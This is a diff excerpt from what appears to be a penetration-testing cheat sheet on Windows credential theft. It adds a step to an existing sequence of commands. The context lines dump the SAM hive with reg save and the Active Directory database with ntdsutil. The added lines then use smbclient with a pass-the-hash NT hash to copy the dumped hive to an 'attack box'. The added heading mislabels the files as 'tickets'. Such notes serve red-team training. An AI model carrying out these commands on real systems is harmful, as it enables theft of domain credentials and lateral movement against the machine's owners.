@@ -130,6 +130,10 @@ reg save HKLM\SAM C:\Windows\Temp\sam.hiv
 
 ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\dump" q q
 
+exit
+
+## Then download the tickets to your attack box via Smbclient
+
 smbclient //$IP/C$ -U 'administrator' \
   --pw-nt-hash $NTHash \
   -c 'get Windows\Temp\sys.hiv /tmp/sys.hiv'
